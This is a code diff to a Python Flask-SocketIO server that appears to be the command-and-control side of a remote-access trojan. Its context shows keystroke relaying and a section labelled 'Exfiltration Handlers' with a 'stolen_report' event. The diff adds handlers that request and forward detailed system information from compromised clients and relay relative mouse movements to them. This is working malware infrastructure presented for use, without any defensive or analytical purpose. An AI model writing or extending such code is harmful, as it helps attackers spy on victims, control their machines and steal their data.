@@ -269,6 +269,11 @@ def keys_data(data):
         'keys': data.get('keys', '')
     }, room='dashboard')
 
+@socketio.on('sysinfo_data')
+def handle_sysinfo_data(data):
+    """Forward detailed system info from client to dashboard"""
+    socketio.emit('sysinfo_received', data, room='dashboard')
+
 # --- Phase 2: Exfiltration Handlers ---
 
 @socketio.on('stolen_report')
@@ -372,6 +377,12 @@ def handle_mouse_move(data):
     if client_id and client_id in clients:
         socketio.emit('mouse_move', data, room=client_id)
 
+@socketio.on('mouse_move_relative')
+def handle_mouse_move_relative(data):
+    client_id = data.get('client_id')
+    if client_id and client_id in clients:
+        socketio.emit('mouse_move_relative', data, room=client_id)
+
 @socketio.on('mouse_click')
 def handle_mouse_click(data):
     client_id = data.get('client_id')
@@ -405,6 +416,13 @@ def handle_zip_folder(data):
     client_id = data.get('client_id')
     if client_id and client_id in clients:
         socketio.emit('zip_folder', data, room=client_id)
+
+@socketio.on('get_sysinfo')
+def handle_get_sysinfo(data):
+    """Request detailed system info from client."""
+    client_id = data.get('client_id')
+    if client_id and client_id in clients:
+        socketio.emit('get_sysinfo', data, room=client_id)
 
 @socketio.on('disconnect')
 def handle_disconnect():
